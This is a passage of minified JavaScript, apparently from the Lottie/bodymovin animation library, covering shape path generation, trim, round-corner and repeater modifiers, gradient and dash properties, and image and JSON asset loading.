e=this.p.v[0],i=this.p.v[1],r=this.s.v[0]/2,n=this.s.v[1]/2,s=3!==this.d,o=this.v;o.v[0][0]=e,o.v[0][1]=i-n,o.v[1][0]=s?e+r:e-r,o.v[1][1]=i,o.v[2][0]=e,o.v[2][1]=i+n,o.v[3][0]=s?e-r:e+r,o.v[3][1]=i,o.i[0][0]=s?e-r*t:e+r*t,o.i[0][1]=i-n,o.i[1][0]=s?e+r:e-r,o.i[1][1]=i-n*t,o.i[2][0]=s?e+r*t:e-r*t,o.i[2][1]=i+n,o.i[3][0]=s?e-r:e+r,o.i[3][1]=i+n*t,o.o[0][0]=s?e+r*t:e-r*t,o.o[0][1]=i-n,o.o[1][0]=s?e+r:e-r,o.o[1][1]=i+n*t,o.o[2][0]=s?e-r*t:e+r*t,o.o[2][1]=i+n,o.o[3][0]=s?e-r:e+r,o.o[3][1]=i-n*t}},extendPrototype([DynamicPropertyContainer],e),e}(),c=function(){function t(t,e){this.v=shape_pool.newElement(),this.v.setPathData(!0,0),this.elem=t,this.comp=t.comp,this.data=e,this.frameId=-1,this.d=e.d,this.initDynamicPropertyContainer(t),1===e.sy?(this.ir=PropertyFactory.getProp(t,e.ir,0,0,this),this.is=PropertyFactory.getProp(t,e.is,0,.01,this),this.convertToPath=this.convertStarToPath):this.convertToPath=this.convertPolygonToPath,this.pt=PropertyFactory.getProp(t,e.pt,0,0,this),this.p=PropertyFactory.getProp(t,e.p,1,0,this),this.r=PropertyFactory.getProp(t,e.r,0,degToRads,this),this.or=PropertyFactory.getProp(t,e.or,0,0,this),this.os=PropertyFactory.getProp(t,e.os,0,.01,this),this.localShapeCollection=shapeCollection_pool.newShapeCollection(),this.localShapeCollection.addShape(this.v),this.paths=this.localShapeCollection,this.dynamicProperties.length?this.k=!0:(this.k=!1,this.convertToPath())}return t.prototype={reset:r,getValue:function(){this.elem.globalData.frameId!==this.frameId&&(this.frameId=this.elem.globalData.frameId,this.iterateDynamicProperties(),this._mdf&&this.convertToPath())},convertStarToPath:function(){var t,e,i,r,n=2*Math.floor(this.pt.v),s=2*Math.PI/n,o=!0,a=this.or.v,l=this.ir.v,h=this.os.v,c=this.is.v,u=2*Math.PI*a/(2*n),d=2*Math.PI*l/(2*n),p=-Math.PI/2;p+=this.r.v;var m=3===this.data.d?-1:1;for(this.v._length=0,t=0;t<n;t+=1){i=o?h:c,r=o?u:d;var f=(e=o?a:l)*Math.cos(p),g=e*Math.sin(p),y=0===f&&0===g?0:g/Math.sqrt(f*f+g*g),v=0===f&&0===g?0:-f/Math.sqrt(f*f+g*g);f+=+this.p.v[0],g+=+this.p.v[1],this.v.setTripleAt(f,g,f-y*r*i*m,g-v*r*i*m,f+y*r*i*m,g+v*r*i*m,t,!0),o=!o,p+=s*m}},convertPolygonToPath:function(){var t,e=Math.floor(this.pt.v),i=2*Math.PI/e,r=this.or.v,n=this.os.v,s=2*Math.PI*r/(4*e),o=-Math.PI/2,a=3===this.data.d?-1:1;for(o+=this.r.v,this.v._length=0,t=0;t<e;t+=1){var l=r*Math.cos(o),h=r*Math.sin(o),c=0===l&&0===h?0:h/Math.sqrt(l*l+h*h),u=0===l&&0===h?0:-l/Math.sqrt(l*l+h*h);l+=+this.p.v[0],h+=+this.p.v[1],this.v.setTripleAt(l,h,l-c*s*n*a,h-u*s*n*a,l+c*s*n*a,h+u*s*n*a,t,!0),o+=i*a}this.paths.length=0,this.paths[0]=this.v}},extendPrototype([DynamicPropertyContainer],t),t}(),u=function(){function t(t,e){this.v=shape_pool.newElement(),this.v.c=!0,this.localShapeCollection=shapeCollection_pool.newShapeCollection(),this.localShapeCollection.addShape(this.v),this.paths=this.localShapeCollection,this.elem=t,this.comp=t.comp,this.frameId=-1,this.d=e.d,this.initDynamicPropertyContainer(t),this.p=PropertyFactory.getProp(t,e.p,1,0,this),this.s=PropertyFactory.getProp(t,e.s,1,0,this),this.r=PropertyFactory.getProp(t,e.r,0,0,this),this.dynamicProperties.length?this.k=!0:(this.k=!1,this.convertRectToPath())}return t.prototype={convertRectToPath:function(){var t=this.p.v[0],e=this.p.v[1],i=this.s.v[0]/2,r=this.s.v[1]/2,n=bm_min(i,r,this.r.v),s=n*(1-roundCorner);this.v._length=0,2===this.d||1===this.d?(this.v.setTripleAt(t+i,e-r+n,t+i,e-r+n,t+i,e-r+s,0,!0),this.v.setTripleAt(t+i,e+r-n,t+i,e+r-s,t+i,e+r-n,1,!0),0!==n?(this.v.setTripleAt(t+i-n,e+r,t+i-n,e+r,t+i-s,e+r,2,!0),this.v.setTripleAt(t-i+n,e+r,t-i+s,e+r,t-i+n,e+r,3,!0),this.v.setTripleAt(t-i,e+r-n,t-i,e+r-n,t-i,e+r-s,4,!0),this.v.setTripleAt(t-i,e-r+n,t-i,e-r+s,t-i,e-r+n,5,!0),this.v.setTripleAt(t-i+n,e-r,t-i+n,e-r,t-i+s,e-r,6,!0),this.v.setTripleAt(t+i-n,e-r,t+i-s,e-r,t+i-n,e-r,7,!0)):(this.v.setTripleAt(t-i,e+r,t-i+s,e+r,t-i,e+r,2),this.v.setTripleAt(t-i,e-r,t-i,e-r+s,t-i,e-r,3))):(this.v.setTripleAt(t+i,e-r+n,t+i,e-r+s,t+i,e-r+n,0,!0),0!==n?(this.v.setTripleAt(t+i-n,e-r,t+i-n,e-r,t+i-s,e-r,1,!0),this.v.setTripleAt(t-i+n,e-r,t-i+s,e-r,t-i+n,e-r,2,!0),this.v.setTripleAt(t-i,e-r+n,t-i,e-r+n,t-i,e-r+s,3,!0),this.v.setTripleAt(t-i,e+r-n,t-i,e+r-s,t-i,e+r-n,4,!0),this.v.setTripleAt(t-i+n,e+r,t-i+n,e+r,t-i+s,e+r,5,!0),this.v.setTripleAt(t+i-n,e+r,t+i-s,e+r,t+i-n,e+r,6,!0),this.v.setTripleAt(t+i,e+r-n,t+i,e+r-n,t+i,e+r-s,7,!0)):(this.v.setTripleAt(t-i,e-r,t-i+s,e-r,t-i,e-r,1,!0),this.v.setTripleAt(t-i,e+r,t-i,e+r-s,t-i,e+r,2,!0),this.v.setTripleAt(t+i,e+r,t+i-s,e+r,t+i,e+r,3,!0)))},getValue:function(t){this.elem.globalData.frameId!==this.frameId&&(this.frameId=this.elem.globalData.frameId,this.iterateDynamicProperties(),this._mdf&&this.convertRectToPath())},reset:r},extendPrototype([DynamicPropertyContainer],t),t}(),d={getShapeProp:function(t,e,i){var r;return 3===i||4===i?r=(3===i?e.pt:e.ks).k.length?new l(t,e,i):new o(t,e,i):5===i?r=new u(t,e):6===i?r=new h(t,e):7===i&&(r=new c(t,e)),r.k&&t.addDynamicProperty(r),r},getConstructorFunction:function(){return o},getKeyframedConstructorFunction:function(){return l}};return d}(),ShapeModifiers=function(){var t={},e={};return t.registerModifier=function(t,i){e[t]||(e[t]=i)},t.getModifier=function(t,i,r){return new e[t](i,r)},t}();function ShapeModifier(){}function TrimModifier(){}function RoundCornersModifier(){}function RepeaterModifier(){}function ShapeCollection(){this._length=0,this._maxLength=4,this.shapes=createSizedArray(this._maxLength)}function DashProperty(t,e,i,r){this.elem=t,this.frameId=-1,this.dataProps=createSizedArray(e.length),this.renderer=i,this.k=!1,this.dashStr="",this.dashArray=createTypedArray("float32",e.length?e.length-1:0),this.dashoffset=createTypedArray("float32",1),this.initDynamicPropertyContainer(r);var n,s,o=e.length||0;for(n=0;n<o;n+=1)s=PropertyFactory.getProp(t,e[n].v,0,0,this),this.k=s.k||this.k,this.dataProps[n]={n:e[n].n,p:s};this.k||this.getValue(!0),this._isAnimated=this.k}function GradientProperty(t,e,i){this.data=e,this.c=createTypedArray("uint8c",4*e.p);var r=e.k.k[0].s?e.k.k[0].s.length-4*e.p:e.k.k.length-4*e.p;this.o=createTypedArray("float32",r),this._cmdf=!1,this._omdf=!1,this._collapsable=this.checkCollapsable(),this._hasOpacity=r,this.initDynamicPropertyContainer(i),this.prop=PropertyFactory.getProp(t,e.k,1,null,this),this.k=this.prop.k,this.getValue(!0)}ShapeModifier.prototype.initModifierProperties=function(){},ShapeModifier.prototype.addShapeToModifier=function(){},ShapeModifier.prototype.addShape=function(t){if(!this.closed){t.sh.container.addDynamicProperty(t.sh);var e={shape:t.sh,data:t,localShapeCollection:shapeCollection_pool.newShapeCollection()};this.shapes.push(e),this.addShapeToModifier(e),this._isAnimated&&t.setAsAnimated()}},ShapeModifier.prototype.init=function(t,e){this.shapes=[],this.elem=t,this.initDynamicPropertyContainer(t),this.initModifierProperties(t,e),this.frameId=initialDefaultFrame,this.closed=!1,this.k=!1,this.dynamicProperties.length?this.k=!0:this.getValue(!0)},ShapeModifier.prototype.processKeys=function(){this.elem.globalData.frameId!==this.frameId&&(this.frameId=this.elem.globalData.frameId,this.iterateDynamicProperties())},extendPrototype([DynamicPropertyContainer],ShapeModifier),extendPrototype([ShapeModifier],TrimModifier),TrimModifier.prototype.initModifierProperties=function(t,e){this.s=PropertyFactory.getProp(t,e.s,0,.01,this),this.e=PropertyFactory.getProp(t,e.e,0,.01,this),this.o=PropertyFactory.getProp(t,e.o,0,0,this),this.sValue=0,this.eValue=0,this.getValue=this.processKeys,this.m=e.m,this._isAnimated=!!this.s.effectsSequence.length||!!this.e.effectsSequence.length||!!this.o.effectsSequence.length},TrimModifier.prototype.addShapeToModifier=function(t){t.pathsData=[]},TrimModifier.prototype.calculateShapeEdges=function(t,e,i,r,n){var s=[];e<=1?s.push({s:t,e:e}):t>=1?s.push({s:t-1,e:e-1}):(s.push({s:t,e:1}),s.push({s:0,e:e-1}));var o,a,l=[],h=s.length;for(o=0;o<h;o+=1)if(!((a=s[o]).e*n<r||a.s*n>r+i)){var c,u;c=a.s*n<=r?0:(a.s*n-r)/i,u=a.e*n>=r+i?1:(a.e*n-r)/i,l.push([c,u])}return l.length||l.push([0,0]),l},TrimModifier.prototype.releasePathsData=function(t){var e,i=t.length;for(e=0;e<i;e+=1)segments_length_pool.release(t[e]);return t.length=0,t},TrimModifier.prototype.processShapes=function(t){var e,i;if(this._mdf||t){var r=this.o.v%360/360;if(r<0&&(r+=1),(e=(this.s.v>1?1:this.s.v<0?0:this.s.v)+r)>(i=(this.e.v>1?1:this.e.v<0?0:this.e.v)+r)){var n=e;e=i,i=n}e=1e-4*Math.round(1e4*e),i=1e-4*Math.round(1e4*i),this.sValue=e,this.eValue=i}else e=this.sValue,i=this.eValue;var s,o,a,l,h,c,u,d=this.shapes.length,p=0;if(i===e)for(o=0;o<d;o+=1)this.shapes[o].localShapeCollection.releaseShapes(),this.shapes[o].shape._mdf=!0,this.shapes[o].shape.paths=this.shapes[o].localShapeCollection,this._mdf&&(this.shapes[o].pathsData.length=0);else if(1===i&&0===e||0===i&&1===e){if(this._mdf)for(o=0;o<d;o+=1)this.shapes[o].pathsData.length=0,this.shapes[o].shape._mdf=!0}else{var m,f,g=[];for(o=0;o<d;o+=1)if((m=this.shapes[o]).shape._mdf||this._mdf||t||2===this.m){if(l=(s=m.shape.paths)._length,u=0,!m.shape._mdf&&m.pathsData.length)u=m.totalShapeLength;else{for(h=this.releasePathsData(m.pathsData),a=0;a<l;a+=1)c=bez.getSegmentsLength(s.shapes[a]),h.push(c),u+=c.totalLength;m.totalShapeLength=u,m.pathsData=h}p+=u,m.shape._mdf=!0}else m.shape.paths=m.localShapeCollection;var y,v=e,_=i,b=0;for(o=d-1;o>=0;o-=1)if((m=this.shapes[o]).shape._mdf){for((f=m.localShapeCollection).releaseShapes(),2===this.m&&d>1?(y=this.calculateShapeEdges(e,i,m.totalShapeLength,b,p),b+=m.totalShapeLength):y=[[v,_]],l=y.length,a=0;a<l;a+=1){v=y[a][0],_=y[a][1],g.length=0,_<=1?g.push({s:m.totalShapeLength*v,e:m.totalShapeLength*_}):v>=1?g.push({s:m.totalShapeLength*(v-1),e:m.totalShapeLength*(_-1)}):(g.push({s:m.totalShapeLength*v,e:m.totalShapeLength}),g.push({s:0,e:m.totalShapeLength*(_-1)}));var w=this.addShapes(m,g[0]);if(g[0].s!==g[0].e){if(g.length>1)if(m.shape.paths.shapes[m.shape.paths._length-1].c){var E=w.pop();this.addPaths(w,f),w=this.addShapes(m,g[1],E)}else this.addPaths(w,f),w=this.addShapes(m,g[1]);this.addPaths(w,f)}}m.shape.paths=f}}},TrimModifier.prototype.addPaths=function(t,e){var i,r=t.length;for(i=0;i<r;i+=1)e.addShape(t[i])},TrimModifier.prototype.addSegment=function(t,e,i,r,n,s,o){n.setXYAt(e[0],e[1],"o",s),n.setXYAt(i[0],i[1],"i",s+1),o&&n.setXYAt(t[0],t[1],"v",s),n.setXYAt(r[0],r[1],"v",s+1)},TrimModifier.prototype.addSegmentFromArray=function(t,e,i,r){e.setXYAt(t[1],t[5],"o",i),e.setXYAt(t[2],t[6],"i",i+1),r&&e.setXYAt(t[0],t[4],"v",i),e.setXYAt(t[3],t[7],"v",i+1)},TrimModifier.prototype.addShapes=function(t,e,i){var r,n,s,o,a,l,h,c,u=t.pathsData,d=t.shape.paths.shapes,p=t.shape.paths._length,m=0,f=[],g=!0;for(i?(a=i._length,c=i._length):(i=shape_pool.newElement(),a=0,c=0),f.push(i),r=0;r<p;r+=1){for(l=u[r].lengths,i.c=d[r].c,s=d[r].c?l.length:l.length+1,n=1;n<s;n+=1)if(m+(o=l[n-1]).addedLength<e.s)m+=o.addedLength,i.c=!1;else{if(m>e.e){i.c=!1;break}e.s<=m&&e.e>=m+o.addedLength?(this.addSegment(d[r].v[n-1],d[r].o[n-1],d[r].i[n],d[r].v[n],i,a,g),g=!1):(h=bez.getNewSegment(d[r].v[n-1],d[r].v[n],d[r].o[n-1],d[r].i[n],(e.s-m)/o.addedLength,(e.e-m)/o.addedLength,l[n-1]),this.addSegmentFromArray(h,i,a,g),g=!1,i.c=!1),m+=o.addedLength,a+=1}if(d[r].c&&l.length){if(o=l[n-1],m<=e.e){var y=l[n-1].addedLength;e.s<=m&&e.e>=m+y?(this.addSegment(d[r].v[n-1],d[r].o[n-1],d[r].i[0],d[r].v[0],i,a,g),g=!1):(h=bez.getNewSegment(d[r].v[n-1],d[r].v[0],d[r].o[n-1],d[r].i[0],(e.s-m)/y,(e.e-m)/y,l[n-1]),this.addSegmentFromArray(h,i,a,g),g=!1,i.c=!1)}else i.c=!1;m+=o.addedLength,a+=1}if(i._length&&(i.setXYAt(i.v[c][0],i.v[c][1],"i",c),i.setXYAt(i.v[i._length-1][0],i.v[i._length-1][1],"o",i._length-1)),m>e.e)break;r<p-1&&(i=shape_pool.newElement(),g=!0,f.push(i),a=0)}return f},ShapeModifiers.registerModifier("tm",TrimModifier),extendPrototype([ShapeModifier],RoundCornersModifier),RoundCornersModifier.prototype.initModifierProperties=function(t,e){this.getValue=this.processKeys,this.rd=PropertyFactory.getProp(t,e.r,0,null,this),this._isAnimated=!!this.rd.effectsSequence.length},RoundCornersModifier.prototype.processPath=function(t,e){var i=shape_pool.newElement();i.c=t.c;var r,n,s,o,a,l,h,c,u,d,p,m,f,g=t._length,y=0;for(r=0;r<g;r+=1)n=t.v[r],o=t.o[r],s=t.i[r],n[0]===o[0]&&n[1]===o[1]&&n[0]===s[0]&&n[1]===s[1]?0!==r&&r!==g-1||t.c?(a=0===r?t.v[g-1]:t.v[r-1],h=(l=Math.sqrt(Math.pow(n[0]-a[0],2)+Math.pow(n[1]-a[1],2)))?Math.min(l/2,e)/l:0,c=m=n[0]+(a[0]-n[0])*h,u=f=n[1]-(n[1]-a[1])*h,d=c-(c-n[0])*roundCorner,p=u-(u-n[1])*roundCorner,i.setTripleAt(c,u,d,p,m,f,y),y+=1,a=r===g-1?t.v[0]:t.v[r+1],h=(l=Math.sqrt(Math.pow(n[0]-a[0],2)+Math.pow(n[1]-a[1],2)))?Math.min(l/2,e)/l:0,c=d=n[0]+(a[0]-n[0])*h,u=p=n[1]+(a[1]-n[1])*h,m=c-(c-n[0])*roundCorner,f=u-(u-n[1])*roundCorner,i.setTripleAt(c,u,d,p,m,f,y),y+=1):(i.setTripleAt(n[0],n[1],o[0],o[1],s[0],s[1],y),y+=1):(i.setTripleAt(t.v[r][0],t.v[r][1],t.o[r][0],t.o[r][1],t.i[r][0],t.i[r][1],y),y+=1);return i},RoundCornersModifier.prototype.processShapes=function(t){var e,i,r,n,s,o,a=this.shapes.length,l=this.rd.v;if(0!==l)for(i=0;i<a;i+=1){if((s=this.shapes[i]).shape.paths,o=s.localShapeCollection,s.shape._mdf||this._mdf||t)for(o.releaseShapes(),s.shape._mdf=!0,e=s.shape.paths.shapes,n=s.shape.paths._length,r=0;r<n;r+=1)o.addShape(this.processPath(e[r],l));s.shape.paths=s.localShapeCollection}this.dynamicProperties.length||(this._mdf=!1)},ShapeModifiers.registerModifier("rd",RoundCornersModifier),extendPrototype([ShapeModifier],RepeaterModifier),RepeaterModifier.prototype.initModifierProperties=function(t,e){this.getValue=this.processKeys,this.c=PropertyFactory.getProp(t,e.c,0,null,this),this.o=PropertyFactory.getProp(t,e.o,0,null,this),this.tr=TransformPropertyFactory.getTransformProperty(t,e.tr,this),this.so=PropertyFactory.getProp(t,e.tr.so,0,.01,this),this.eo=PropertyFactory.getProp(t,e.tr.eo,0,.01,this),this.data=e,this.dynamicProperties.length||this.getValue(!0),this._isAnimated=!!this.dynamicProperties.length,this.pMatrix=new Matrix,this.rMatrix=new Matrix,this.sMatrix=new Matrix,this.tMatrix=new Matrix,this.matrix=new Matrix},RepeaterModifier.prototype.applyTransforms=function(t,e,i,r,n,s){var o=s?-1:1,a=r.s.v[0]+(1-r.s.v[0])*(1-n),l=r.s.v[1]+(1-r.s.v[1])*(1-n);t.translate(r.p.v[0]*o*n,r.p.v[1]*o*n,r.p.v[2]),e.translate(-r.a.v[0],-r.a.v[1],r.a.v[2]),e.rotate(-r.r.v*o*n),e.translate(r.a.v[0],r.a.v[1],r.a.v[2]),i.translate(-r.a.v[0],-r.a.v[1],r.a.v[2]),i.scale(s?1/a:a,s?1/l:l),i.translate(r.a.v[0],r.a.v[1],r.a.v[2])},RepeaterModifier.prototype.init=function(t,e,i,r){for(this.elem=t,this.arr=e,this.pos=i,this.elemsData=r,this._currentCopies=0,this._elements=[],this._groups=[],this.frameId=-1,this.initDynamicPropertyContainer(t),this.initModifierProperties(t,e[i]);i>0;)i-=1,this._elements.unshift(e[i]);this.dynamicProperties.length?this.k=!0:this.getValue(!0)},RepeaterModifier.prototype.resetElements=function(t){var e,i=t.length;for(e=0;e<i;e+=1)t[e]._processed=!1,"gr"===t[e].ty&&this.resetElements(t[e].it)},RepeaterModifier.prototype.cloneElements=function(t){t.length;var e=JSON.parse(JSON.stringify(t));return this.resetElements(e),e},RepeaterModifier.prototype.changeGroupRender=function(t,e){var i,r=t.length;for(i=0;i<r;i+=1)t[i]._render=e,"gr"===t[i].ty&&this.changeGroupRender(t[i].it,e)},RepeaterModifier.prototype.processShapes=function(t){var e,i,r,n,s;if(this._mdf||t){var o,a=Math.ceil(this.c.v);if(this._groups.length<a){for(;this._groups.length<a;){var l={it:this.cloneElements(this._elements),ty:"gr"};l.it.push({a:{a:0,ix:1,k:[0,0]},nm:"Transform",o:{a:0,ix:7,k:100},p:{a:0,ix:2,k:[0,0]},r:{a:1,ix:6,k:[{s:0,e:0,t:0},{s:0,e:0,t:1}]},s:{a:0,ix:3,k:[100,100]},sa:{a:0,ix:5,k:0},sk:{a:0,ix:4,k:0},ty:"tr"}),this.arr.splice(0,0,l),this._groups.splice(0,0,l),this._currentCopies+=1}this.elem.reloadShapes()}for(s=0,r=0;r<=this._groups.length-1;r+=1)o=s<a,this._groups[r]._render=o,this.changeGroupRender(this._groups[r].it,o),s+=1;this._currentCopies=a;var h=this.o.v,c=h%1,u=h>0?Math.floor(h):Math.ceil(h),d=(this.tr.v.props,this.pMatrix.props),p=this.rMatrix.props,m=this.sMatrix.props;this.pMatrix.reset(),this.rMatrix.reset(),this.sMatrix.reset(),this.tMatrix.reset(),this.matrix.reset();var f,g,y=0;if(h>0){for(;y<u;)this.applyTransforms(this.pMatrix,this.rMatrix,this.sMatrix,this.tr,1,!1),y+=1;c&&(this.applyTransforms(this.pMatrix,this.rMatrix,this.sMatrix,this.tr,c,!1),y+=c)}else if(h<0){for(;y>u;)this.applyTransforms(this.pMatrix,this.rMatrix,this.sMatrix,this.tr,1,!0),y-=1;c&&(this.applyTransforms(this.pMatrix,this.rMatrix,this.sMatrix,this.tr,-c,!0),y-=c)}for(r=1===this.data.m?0:this._currentCopies-1,n=1===this.data.m?1:-1,s=this._currentCopies;s;){if(g=(i=(e=this.elemsData[r].it)[e.length-1].transform.mProps.v.props).length,e[e.length-1].transform.mProps._mdf=!0,e[e.length-1].transform.op._mdf=!0,e[e.length-1].transform.op.v=this.so.v+(this.eo.v-this.so.v)*(r/(this._currentCopies-1)),0!==y){for((0!==r&&1===n||r!==this._currentCopies-1&&-1===n)&&this.applyTransforms(this.pMatrix,this.rMatrix,this.sMatrix,this.tr,1,!1),this.matrix.transform(p[0],p[1],p[2],p[3],p[4],p[5],p[6],p[7],p[8],p[9],p[10],p[11],p[12],p[13],p[14],p[15]),this.matrix.transform(m[0],m[1],m[2],m[3],m[4],m[5],m[6],m[7],m[8],m[9],m[10],m[11],m[12],m[13],m[14],m[15]),this.matrix.transform(d[0],d[1],d[2],d[3],d[4],d[5],d[6],d[7],d[8],d[9],d[10],d[11],d[12],d[13],d[14],d[15]),f=0;f<g;f+=1)i[f]=this.matrix.props[f];this.matrix.reset()}else for(this.matrix.reset(),f=0;f<g;f+=1)i[f]=this.matrix.props[f];y+=1,s-=1,r+=n}}else for(s=this._currentCopies,r=0,n=1;s;)i=(e=this.elemsData[r].it)[e.length-1].transform.mProps.v.props,e[e.length-1].transform.mProps._mdf=!1,e[e.length-1].transform.op._mdf=!1,s-=1,r+=n},RepeaterModifier.prototype.addShape=function(){},ShapeModifiers.registerModifier("rp",RepeaterModifier),ShapeCollection.prototype.addShape=function(t){this._length===this._maxLength&&(this.shapes=this.shapes.concat(createSizedArray(this._maxLength)),this._maxLength*=2),this.shapes[this._length]=t,this._length+=1},ShapeCollection.prototype.releaseShapes=function(){var t;for(t=0;t<this._length;t+=1)shape_pool.release(this.shapes[t]);this._length=0},DashProperty.prototype.getValue=function(t){if((this.elem.globalData.frameId!==this.frameId||t)&&(this.frameId=this.elem.globalData.frameId,this.iterateDynamicProperties(),this._mdf=this._mdf||t,this._mdf)){var e=0,i=this.dataProps.length;for("svg"===this.renderer&&(this.dashStr=""),e=0;e<i;e+=1)"o"!=this.dataProps[e].n?"svg"===this.renderer?this.dashStr+=" "+this.dataProps[e].p.v:this.dashArray[e]=this.dataProps[e].p.v:this.dashoffset[0]=this.dataProps[e].p.v}},extendPrototype([DynamicPropertyContainer],DashProperty),GradientProperty.prototype.comparePoints=function(t,e){for(var i=0,r=this.o.length/2;i<r;){if(Math.abs(t[4*i]-t[4*e+2*i])>.01)return!1;i+=1}return!0},GradientProperty.prototype.checkCollapsable=function(){if(this.o.length/2!=this.c.length/4)return!1;if(this.data.k.k[0].s)for(var t=0,e=this.data.k.k.length;t<e;){if(!this.comparePoints(this.data.k.k[t].s,this.data.p))return!1;t+=1}else if(!this.comparePoints(this.data.k.k,this.data.p))return!1;return!0},GradientProperty.prototype.getValue=function(t){if(this.prop.getValue(),this._mdf=!1,this._cmdf=!1,this._omdf=!1,this.prop._mdf||t){var e,i,r,n=4*this.data.p;for(e=0;e<n;e+=1)i=e%4==0?100:255,r=Math.round(this.prop.v[e]*i),this.c[e]!==r&&(this.c[e]=r,this._cmdf=!t);if(this.o.length)for(n=this.prop.v.length,e=4*this.data.p;e<n;e+=1)i=e%2==0?100:1,r=e%2==0?Math.round(100*this.prop.v[e]):this.prop.v[e],this.o[e-4*this.data.p]!==r&&(this.o[e-4*this.data.p]=r,this._omdf=!t);this._mdf=!t}},extendPrototype([DynamicPropertyContainer],GradientProperty);var buildShapeString=function(t,e,i,r){if(0===e)return"";var n,s=t.o,o=t.i,a=t.v,l=" M"+r.applyToPointStringified(a[0][0],a[0][1]);for(n=1;n<e;n+=1)l+=" C"+r.applyToPointStringified(s[n-1][0],s[n-1][1])+" "+r.applyToPointStringified(o[n][0],o[n][1])+" "+r.applyToPointStringified(a[n][0],a[n][1]);return i&&e&&(l+=" C"+r.applyToPointStringified(s[n-1][0],s[n-1][1])+" "+r.applyToPointStringified(o[0][0],o[0][1])+" "+r.applyToPointStringified(a[0][0],a[0][1]),l+="z"),l},ImagePreloader=function(){var t=function(){var t=createTag("canvas");t.width=1,t.height=1;var e=t.getContext("2d");return e.fillStyle="rgba(0,0,0,0)",e.fillRect(0,0,1,1),t}();function e(){this.loadedAssets+=1,this.loadedAssets===this.totalImages&&this.imagesLoadedCb&&this.imagesLoadedCb(null)}function i(t,e,i){var r="";if(t.e)r=t.p;else if(e){var n=t.p;-1!==n.indexOf("images/")&&(n=n.split("/")[1]),r=e+n}else r=i,r+=t.u?t.u:"",r+=t.p;return r}function r(t){this._imageLoaded=e.bind(this),this.assetsPath="",this.path="",this.totalImages=0,this.loadedAssets=0,this.imagesLoadedCb=null,this.images=[]}return r.prototype={loadAssets:function(t,e){this.imagesLoadedCb=e;var i,r=t.length;for(i=0;i<r;i+=1)t[i].layers||(this.totalImages+=1,this.images.push(this._createImageData(t[i])))},setAssetsPath:function(t){this.assetsPath=t||""},setPath:function(t){this.path=t||""},loaded:function(){return this.totalImages===this.loadedAssets},destroy:function(){this.imagesLoadedCb=null,this.images.length=0},getImage:function(t){for(var e=0,i=this.images.length;e<i;){if(this.images[e].assetData===t)return this.images[e].img;e+=1}},createImgData:function(e){var r=i(e,this.assetsPath,this.path),n=createTag("img");n.crossOrigin="anonymous",n.addEventListener("load",this._imageLoaded,!1),n.addEventListener("error",function(){s.img=t,this._imageLoaded()}.bind(this),!1),n.src=r;var s={img:n,assetData:e};return s},createImageData:function(e){var r=i(e,this.assetsPath,this.path),n=createNS("image");n.addEventListener("load",this._imageLoaded,!1),n.addEventListener("error",function(){s.img=t,this._imageLoaded()}.bind(this),!1),n.setAttributeNS("http://www.w3.org/1999/xlink","href",r);var s={img:n,assetData:e};return s},imageLoaded:e,setCacheType:function(t){this._createImageData="svg"===t?this.createImageData.bind(this):this.createImgData.bind(this)}},r}(),featureSupport=function(){var t={maskType:!0};return(/MSIE 10/i.test(navigator.userAgent)||/MSIE 9/i.test(navigator.userAgent)||/rv:11.0/i.test(navigator.userAgent)||/Edge\/\d./i.test(navigator.userAgent))&&(t.maskType=!1),t}(),filtersFactory=function(){var t={createFilter:function(t){var e=createNS("filter");return e.setAttribute("id",t),e.setAttribute("filterUnits","objectBoundingBox"),e.setAttribute("x","0%"),e.setAttribute("y","0%"),e.setAttribute("width","100%"),e.setAttribute("height","100%"),e},createAlphaToLuminanceFilter:function(){var t=createNS("feColorMatrix");return t.setAttribute("type","matrix"),t.setAttribute("color-interpolation-filters","sRGB"),t.setAttribute("values","0 0 0 1 0  0 0 0 1 0  0 0 0 1 0  0 0 0 1 1"),t}};return t}(),assetLoader=function(){function t(t){return t.response&&"object"==typeof t.response?t.response:t.response&&"string"==typeof t.response?JSON.parse(t.response):t.responseText?JSON.parse(t.responseText):void 0}return{load:function(e,i,r){var n,s=new XMLHttpRequest;s.open("GET",e,!0);try{s.responseType="json"}catch(t){}s.send(),s.onreadystatechange=function(){if(4==s.readyState)if(200==s.status)n=t(s),i(n);else try{n=t(s),i(n)}catch(t){r&&r(t)}}}}}();function TextAnimatorProperty(t,e,i){this._isFirstFrame=!0,this._hasMaskedPath=!1,this._frameId=-1,this._textData=t,this._renderType=e,this._elem=i,this._animatorsData=createSizedArray(this._textData.a.length),this._pathData={},this._moreOptions={alignment:{}},this.renderedLetters=[],this.lettersChangedFlag=!1,this.initDynamicPropertyContainer(i)}function TextAnimatorDataProperty(t,e,i){var r={propType:!1},n=PropertyFactory.getProp,s=e.a;this.a={r:s.r?n(t,s.r,0,degToRads,i):r,rx:s.rx?n(t,s.rx,0,degToRads,i):r,ry:s.ry?n(t,s.ry,0,degToRads,i):r,sk:s.sk?n(t,s.sk,0,degToRads,i):r,sa:s.sa?n(t,s.sa,0,degToRads,i):r,s:s.s?n(t,s.s,1,.01,i):r,a:s.a?n(t,s.a,1,0,i):r,o:s.o?n(t,s.o,0,.01,i):r,p:s.p?n(t,s.p,1,0,i):r,sw:s.sw?n(t,s.sw,0,0,i):r,sc:s.sc?n(t,s.sc,1,0,i):r,fc:s.fc?n(t,s.fc,1,0,i):r,fh:s.fh?n(t,s.fh,0,0,i):r,fs:s.fs?n(t,s.fs,0,.01,i):r,fb:s.fb?n(t,s.fb,0,.01,i):r,t:s.t?n(t,s.t,0,0,i):r},this.s=TextSelectorProp.getTextSelectorProp(t,e.s,i),this.s.t=e.s.t}function LetterProps(t,e,i,r,n,s){this.o=t,this.sw=e,this.sc=i,this.fc=r,this.m=n,this.p=s,this._mdf={o:!0,sw:!!e,sc:!!i,fc:!!r,m:!0,p:!0}}function 